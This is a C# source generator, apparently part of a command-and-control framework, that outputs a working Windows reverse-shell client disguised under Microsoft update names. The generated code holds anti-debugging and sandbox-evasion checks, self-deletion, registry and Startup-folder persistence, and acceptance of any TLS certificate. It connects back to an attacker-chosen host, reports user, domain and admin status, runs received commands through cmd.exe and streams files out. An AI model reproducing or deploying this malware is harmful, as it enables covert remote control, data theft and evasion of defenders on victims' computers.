namespace C2Framework
{
    public static class ClientSourceGenerator
    {
        public static string GenerateClientSource(string serverIP, int serverPort)
        {
            string clientSource = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Linq;

namespace Microsoft.Windows.UpdateCheck
{
    class Program
    {
        // === CONFIGURATION ===
        private static string _currentDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private static string SERVER_IP = ""##SERVER_IP##"";
        private static int SERVER_PORT = ##SERVER_PORT##;
        
        // === STEALTH SETTINGS ===
        private static bool ENABLE_VMWARE_DETECTION = false; // Set to true for production
        private static bool ENABLE_ANTI_DEBUG = false; // Disabled for testing
        private static bool ENABLE_PERSISTENCE = false; // Disabled for testing
        private static bool ENABLE_MEMORY_PROTECTION = true;
        private static bool ENABLE_SELF_DELETE = true; // Can be disabled for debugging

        // === RUNTIME VARIABLES ===
        private static Random _random = new Random();
        private static string _currentExecutablePath = """";
        private static byte[] _encryptionKey = { 0x4B, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35 };
        private static int _connectionAttempts = 0;

        // === USER AGENTS FOR STEALTH ===
        private static readonly string[] USER_AGENTS = {
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"",
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"",
            ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15""
        };

        // === WIN32 API IMPORTS ===
        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetCurrentProcess();

        [DllImport(""kernel32.dll"")]
        static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);

        [DllImport(""kernel32.dll"")]
        static extern bool IsDebuggerPresent();

        [DllImport(""ntdll.dll"")]
        static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
            ref ProcessBasicInformation processInformation, int processInformationLength, IntPtr returnLength);

        [DllImport(""user32.dll"")]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

        [StructLayout(LayoutKind.Sequential)]
        struct ProcessBasicInformation
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                // Store executable path
                _currentExecutablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                // Check for debug argument
                if (args.Length > 0 && args[0] == ""--debug"")
                {
                    ENABLE_ANTI_DEBUG = false;
                    ENABLE_PERSISTENCE = false;
                    ENABLE_SELF_DELETE = false;
                }

                // === ANTI-ANALYSIS CHECKS ===
                if (ShouldExit())
                {
                    Environment.Exit(0);
                }

                // === INITIAL EVASION SLEEP (reduced for testing) ===
                SleepEvasion();

                // === SELF-DELETION ===
                if (ENABLE_SELF_DELETE)
                {
                    DeleteSelfImmediately();
                }

                // === MEMORY PROTECTION ===
                if (ENABLE_MEMORY_PROTECTION)
                {
                    HideFromMemoryAnalysis();
                }

                // === ESTABLISH PERSISTENCE ===
                if (ENABLE_PERSISTENCE)
                {
                    Task.Run(() => EstablishPersistence());
                }

                // === MAIN CONNECTION LOOP ===
                AdaptiveConnectionLoop();
            }
            catch (Exception)
            {
                // Silent exit on any error
                Environment.Exit(0);
            }
        }

        static bool ShouldExit()
        {
            try
            {
                // Check for debugger
                if (ENABLE_ANTI_DEBUG && IsBeingDebugged())
                    return true;

                // Check for analysis tools
                if (ENABLE_ANTI_DEBUG && IsAnalysisToolPresent())
                    return true;

                // Check for sandbox (excluding VMware for testing)
                if (ENABLE_VMWARE_DETECTION && IsRunningInSandbox())
                    return true;

                // Check system resources
                if (ENABLE_ANTI_DEBUG && HasSuspiciousSystemResources())
                    return true;

                return false;
            }
            catch
            {
                return false; // Don't exit on error during testing
            }
        }

        static bool IsBeingDebugged()
        {
            try
            {
                if (IsDebuggerPresent())
                    return true;

                if (System.Diagnostics.Debugger.IsAttached)
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        static bool IsAnalysisToolPresent()
        {
            try
            {
                string[] analysisTools = {
                    ""ollydbg"", ""ida"", ""ida64"", ""idaq"", ""idaq64"", ""idaw"", ""idaw64"",
                    ""x32dbg"", ""x64dbg"", ""windbg"", ""cheatengine"", ""processhacker"",
                    ""procmon"", ""procexp"", ""wireshark"", ""fiddler"", ""burpsuite"",
                    ""dnspy"", ""reflexil"", ""megadumper"", ""scylla"", ""pestudio""
                };

                foreach (string tool in analysisTools)
                {
                    if (Process.GetProcessesByName(tool).Length > 0)
                        return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        static bool IsRunningInSandbox()
        {
            try
            {
                // Check for sandbox processes (excluding VMware for testing)
                string[] sandboxProcesses = {
                    ""vboxtray"", ""vboxservice"", ""vboxcontrol"",
                    ""sandboxiedcomlaunch"", ""sandboxierpcss"", ""procmon"",
                    ""regmon"", ""filemon"", ""wireshark"", ""netmon"", ""prl_cc"",
                    ""prl_tools"", ""xenservice"", ""qemu-ga""
                };

                foreach (string proc in sandboxProcesses)
                {
                    if (Process.GetProcessesByName(proc).Length > 0)
                        return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        static bool HasSuspiciousSystemResources()
        {
            try
            {
                // Check CPU cores (but be lenient for VMware)
                if (Environment.ProcessorCount == 1)
                    return true;

                // Check uptime (fresh sandboxes have low uptime)
                if (Environment.TickCount < 120000) // Less than 2 minutes
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        static void SleepEvasion()
        {
            try
            {
                // Sleep for random time between 2-5 seconds (reduced for testing)
                int sleepTime = _random.Next(2000, 5000);
                Thread.Sleep(sleepTime);
            }
            catch { }
        }

        static void HideFromMemoryAnalysis()
        {
            try
            {
                // Minimize memory footprint
                SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);

                // Force garbage collection
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            catch { }
        }

        static void EstablishPersistence()
        {
            try
            {
                // Registry Run key
                try
                {
                    using (var key = Registry.CurrentUser.OpenSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"", true))
                    {
                        key?.SetValue(""WindowsSecurityUpdate"", $""\""{_currentExecutablePath}\"""");
                    }
                }
                catch { }

                // Startup folder
                try
                {
                    string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string linkPath = Path.Combine(startupPath, ""WindowsUpdate.exe"");
                    File.Copy(_currentExecutablePath, linkPath, true);
                }
                catch { }
            }
            catch { }
        }

        static void AdaptiveConnectionLoop()
        {
            while (true)
            {
                try
                {
                    Connect();
                    _connectionAttempts = 0; // Reset on successful connection
                }
                catch (Exception)
                {
                    _connectionAttempts++;

                    // Shorter delays for testing
                    int baseDelay = Math.Min(30000, 2000 * Math.Min(_connectionAttempts, 5));
                    int jitter = _random.Next(0, baseDelay / 2);
                    int totalDelay = baseDelay + jitter;

                    Thread.Sleep(totalDelay);
                }
            }
        }

        static void Connect()
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    // Connection timeout
                    var connectTask = client.ConnectAsync(SERVER_IP, SERVER_PORT);
                    if (!Task.WhenAny(connectTask, Task.Delay(15000)).Result.IsCompleted)
                    {
                        throw new TimeoutException(""Connection attempt timed out"");
                    }

                    using (NetworkStream baseStream = client.GetStream())
                    using (SslStream sslStream = new SslStream(baseStream, false, ValidateServerCertificate))
                    {
                        try
                        {
                            sslStream.AuthenticateAsClient(SERVER_IP);
                        }
                        catch (Exception)
                        {
                            return;
                        }

                        using (StreamReader reader = new StreamReader(sslStream))
                        using (StreamWriter writer = new StreamWriter(sslStream) { AutoFlush = true })
                        {
                            // Send system info
                            SendSystemInfo(writer);

                            string command;
                            while ((command = reader.ReadLine()) != null)
                            {
                                if (string.IsNullOrEmpty(command))
                                    continue;

                                if (command.ToLower() == ""exit"")
                                    break;

                                // Handle directory change commands
                                if (command.StartsWith(""##CD_COMMAND##""))
                                {
                                    HandleDirectoryChange(command, writer);
                                    continue;
                                }

                                // Handle special commands
                                if (command.Contains(""certutil -encode"") || command.StartsWith(""type "") || command.Contains(""Get-Content""))
                                {
                                    ExecuteCommandCapture(command, writer);
                                }
                                else
                                {
                                    string output = ExecuteCommandWithDir(command, writer);
                                    writer.WriteLine(output);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                Thread.Sleep(1000);
                throw; // Re-throw for retry logic
            }
        }

        static void HandleDirectoryChange(string command, StreamWriter writer)
        {
            try
            {
                string path = command.Substring(""##CD_COMMAND##"".Length).Trim();

                if (string.IsNullOrEmpty(path))
                {
                    writer.WriteLine(_currentDirectory);
                }
                else if (path == ""/"")
                {
                    _currentDirectory = Path.GetPathRoot(Environment.SystemDirectory) ?? _currentDirectory;
                    writer.WriteLine(_currentDirectory);
                }
                else if (path.Contains("":""))
                {
                    if (Directory.Exists(path))
                    {
                        _currentDirectory = path;
                        writer.WriteLine(_currentDirectory);
                    }
                    else
                    {
                        writer.WriteLine($""Directory not found: {path}"");
                    }
                }
                else
                {
                    string newPath = Path.GetFullPath(Path.Combine(_currentDirectory ?? string.Empty, path));
                    if (Directory.Exists(newPath))
                    {
                        _currentDirectory = newPath;
                        writer.WriteLine(_currentDirectory);
                    }
                    else
                    {
                        writer.WriteLine($""Directory not found: {newPath}"");
                    }
                }
            }
            catch (Exception ex)
            {
                writer.WriteLine($""Error changing directory: {ex.Message}"");
            }
        }

        static void SendSystemInfo(StreamWriter writer)
        {
            try
            {
                string userName = Environment.UserName;
                string computerName = Environment.MachineName;
                string osVersion = GetFriendlyWindowsVersion();
                string isAdmin = IsAdministrator() ? ""Yes"" : ""No"";
                string domain = Environment.UserDomainName;

                string info = $""System Information:\n"" +
                              $""-------------------\n"" +
                              $""User: {userName}\n"" +
                              $""Computer: {computerName}\n"" +
                              $""Domain: {domain}\n"" +
                              $""OS: {osVersion}\n"" +
                              $""Admin: {isAdmin}\n"" +
                              $""-------------------\n"";

                writer.WriteLine(info);
            }
            catch (Exception ex)
            {
                writer.WriteLine($""Error getting system info: {ex.Message}"");
            }
        }

        static string ExecuteCommandWithDir(string command, StreamWriter writer = null)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = ""cmd.exe"",
                    Arguments = $""/c {command}"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = _currentDirectory
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    return string.IsNullOrEmpty(error) ? output : output + ""\n"" + error;
                }
            }
            catch (Exception ex)
            {
                return $""Error executing command: {ex.Message}"";
            }
        }

        static string ExecuteCommandCapture(string command, StreamWriter writer)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = ""cmd.exe"",
                    Arguments = $""/c {command}"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = _currentDirectory
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    StringBuilder output = new StringBuilder();
                    StringBuilder error = new StringBuilder();

                    process.Start();

                    process.OutputDataReceived += (sender, e) =>
                    {
                        if (e.Data != null)
                        {
                            writer.WriteLine(e.Data);
                            output.AppendLine(e.Data);
                        }
                    };

                    process.ErrorDataReceived += (sender, e) =>
                    {
                        if (e.Data != null)
                        {
                            writer.WriteLine(e.Data);
                            error.AppendLine(e.Data);
                        }
                    };

                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();
                    process.WaitForExit();

                    return string.IsNullOrEmpty(error.ToString()) ? output.ToString() : output.ToString() + ""\n"" + error.ToString();
                }
            }
            catch (Exception ex)
            {
                string errorMsg = $""Error executing command: {ex.Message}"";
                writer.WriteLine(errorMsg);
                return errorMsg;
            }
        }

        static void TransferFile(string filePath, StreamWriter writer)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    writer.WriteLine($""File not found: {filePath}"");
                    return;
                }

                const int chunkSize = 8192;
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[chunkSize];
                    int bytesRead;

                    writer.WriteLine($""FILE_TRANSFER_BEGIN:{Path.GetFileName(filePath)}:{fs.Length}"");

                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string chunk = Convert.ToBase64String(buffer, 0, bytesRead);
                        writer.WriteLine(chunk);
                        Thread.Sleep(10);
                    }

                    writer.WriteLine(""FILE_TRANSFER_END"");
                }
            }
            catch (Exception ex)
            {
                writer.WriteLine($""Error transferring file: {ex.Message}"");
            }
        }

        static bool IsAdministrator()
        {
            try
            {
                using (Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ""net"",
                        Arguments = ""session"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                })
                {
                    process.Start();
                    process.WaitForExit();
                    return process.ExitCode == 0;
                }
            }
            catch
            {
                return false;
            }
        }

        static void DeleteSelfImmediately()
        {
            try
            {
                if (string.IsNullOrEmpty(_currentExecutablePath) || !File.Exists(_currentExecutablePath))
                    return;

                // Method 1: Try to move file first (works even when locked)
                string tempDir = Path.GetTempPath();
                string tempFile = Path.Combine(tempDir, $""~tmp{Environment.TickCount}.exe"");

                try
                {
                    // Move the file (this releases the lock on original location)
                    File.Move(_currentExecutablePath, tempFile);

                    // Schedule deletion of moved file
                    Task.Run(() =>
                    {
                        Thread.Sleep(5000); // Wait 5 seconds
                        try
                        {
                            File.Delete(tempFile);
                        }
                        catch { }
                    });

                    return; // Success
                }
                catch
                {
                    // If move fails, try overwrite method
                }

                // Method 2: Overwrite the file with zeros (makes recovery harder)
                try
                {
                    using (var stream = new FileStream(_currentExecutablePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
                    {
                        byte[] zeros = new byte[1024];
                        long fileSize = stream.Length;
                        stream.Position = 0;

                        for (long i = 0; i < fileSize; i += zeros.Length)
                        {
                            int bytesToWrite = (int)Math.Min(zeros.Length, fileSize - i);
                            stream.Write(zeros, 0, bytesToWrite);
                        }
                        stream.Flush();
                    }
                }
                catch { }

                // Method 3: Schedule for deletion on reboot
                SetPendingDeletion();
            }
            catch
            {
                // Silent fail
            }
        }
static string GetFriendlyWindowsVersion()
{
    try
    {
        string rawVersion = Environment.OSVersion.ToString();
        // Extract build number
        var match = System.Text.RegularExpressions.Regex.Match(rawVersion, @""(\d+)\.(\d+)\.(\d+)"");
        if (match.Success)
        {
            int build = int.Parse(match.Groups[3].Value);
            return build switch
            {
                >= 22631 => ""Windows 11 23H2"",
                >= 22621 => ""Windows 11 22H2"",
                >= 22000 => ""Windows 11"",
                >= 20348 => ""Windows Server 2022"", 
                >= 19045 => ""Windows 10 22H2"",
                >= 19044 => ""Windows 10 21H2"",
                _ => ""Windows 10""
            };
        }
        return rawVersion;
    }
    catch
    {
        return Environment.OSVersion.ToString();
    }
}

        static void SetPendingDeletion()
        {
            try
            {
                MoveFileEx(_currentExecutablePath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
            }
            catch { }
        }

        static bool ValidateServerCertificate(object sender, X509Certificate certificate,
                                            X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            // Accept any certificate for stealth
            return true;
        }
    }
}";

            clientSource = clientSource.Replace("##SERVER_IP##", serverIP);
            clientSource = clientSource.Replace("##SERVER_PORT##", serverPort.ToString());

            return clientSource;
        }


        public static string GetProjectFileContent()
        {
            return @"
<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <AssemblyName>ReverseShellClient</AssemblyName>
    <RootNamespace>ReverseShellClient</RootNamespace>
    <DebugType>None</DebugType>
    <PublishSingleFile>true</PublishSingleFile>
    <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
    <PublishTrimmed>true</PublishTrimmed>
    <TrimMode>link</TrimMode>
    <IncludeNativeDebugSymbols>false</IncludeNativeDebugSymbols>
    <EnableComHosting>false</EnableComHosting>
    <EnableUnsafeBinaryFormatterSerialization>false</EnableUnsafeBinaryFormatterSerialization>
    <EventSourceSupport>false</EventSourceSupport>
  </PropertyGroup>
</Project>";
        }
    }
}